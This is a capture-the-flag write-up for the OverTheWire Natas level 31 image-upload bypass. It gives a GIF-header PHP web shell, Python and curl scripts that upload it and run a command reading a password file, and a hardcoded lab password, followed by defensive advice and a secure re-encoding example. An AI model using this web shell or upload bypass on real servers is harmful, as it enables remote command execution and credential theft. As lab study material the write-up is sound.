31 File Upload — Image Verification Bypass Hard

// Key Concepts

File Upload Image Verification Magic Bytes GIF Injection PHP Code Execution

// Challenge Overview

This level has a file upload feature that attempts to verify that the uploaded file is a valid image. However, the verification is done using getimagesize() and exif_imagetype(), which only check the file header. We can bypass this by creating a file that starts with valid image data but also contains PHP code.

// Initial Analysis

View the source code:

<?php if (array_key_exists("upload", $_FILES)) { $filename = $_FILES["upload"]["name"]; $tmp_name = $_FILES["upload"]["tmp_name"]; if (getimagesize($tmp_name) !== false && exif_imagetype($tmp_name) !== false) { move_uploaded_file($tmp_name, "upload/" . $filename); echo "File uploaded successfully!"; } else { echo "Invalid image file!"; } } ?>

The application uses getimagesize() and exif_imagetype() to verify the file is an image. These functions only check the file header (magic bytes).

💡 getimagesize() and exif_imagetype() check the file header to determine if it's a valid image. By adding image headers to our malicious file, we can bypass these checks.

// Solution Walkthrough

Step 1 — Create a PHP file with an image header:

We need to create a file that looks like an image to getimagesize() but also contains PHP code:

GIF89a; <?php passthru($_GET['cmd']); ?>

Step 2 — Save the file as shell.php or shell.gif:

Even if the extension is .php, the getimagesize() check will still pass because the file starts with valid GIF data.

Step 3 — Upload the file:

The server will accept the file because it passes the image verification checks.

Step 4 — Access the uploaded PHP file:

http://natas31.natas.labs.overthewire.org/upload/shell.php?cmd=cat /etc/natas_webpass/natas32

Using Python to generate and upload:

import requests import io url = "http://natas31.natas.labs.overthewire.org/" auth = ("natas31", "kAv4NINJbG4JFEqPB7PmNPTOeSMOkFjS") # Create a malicious file with GIF header payload = """GIF89a; <?php passthru($_GET['cmd']); ?>""" files = {'upload': ('shell.php', payload, 'image/gif')} data = {'upload': 'Upload'} response = requests.post(url, auth=auth, files=files, data=data) print(response.text) # Now access the uploaded file url2 = "http://natas31.natas.labs.overthewire.org/upload/shell.php" params = {"cmd": "cat /etc/natas_webpass/natas32"} response2 = requests.get(url2, auth=auth, params=params) print(response2.text)

Using curl:

# Create the file echo -e "GIF89a;\n<?php passthru(\$_GET['cmd']); ?>" > shell.php # Upload curl -u natas31:kAv4NINJbG4JFEqPB7PmNPTOeSMOkFjS \ -F "upload=@shell.php" \ http://natas31.natas.labs.overthewire.org/ # Execute curl -u natas31:kAv4NINJbG4JFEqPB7PmNPTOeSMOkFjS \ "http://natas31.natas.labs.overthewire.org/upload/shell.php?cmd=cat /etc/natas_webpass/natas32"

// Why It Works

The image verification bypass works because:

  • Header-only check: getimagesize() only checks the file header.
  • GIF header: GIF89a is recognized as a valid GIF image.
  • PHP code remains: The PHP code after the GIF header is not checked.
  • No content validation: The server doesn't verify the entire file.

// Image Header Reference

// Defensive Measures

  • Re-encode uploaded images using GD or ImageMagick to strip any embedded code.
  • Validate the entire file — don't just check the header.
  • Disable PHP execution in the upload directory using .htaccess.
  • Store uploaded files outside the web root.
  • Use a whitelist of allowed file types.

// Secure Image Upload Example

<?php if (getimagesize($tmp_name) !== false) { // Re-encode the image to remove any embedded code $image = imagecreatefromgif($tmp_name); imagegif($image, $upload_path); // Or use ImageMagick $image = new Imagick($tmp_name); $image->writeImage($upload_path); } ?>

// Key Takeaways

🖼️ Header Checks Are Not Enough

Checking only the file header is insufficient. Attackers can add valid image headers to malicious files.

🔄 Re-encode Uploaded Images

Re-encoding images removes any embedded malicious code and ensures the file is truly an image.
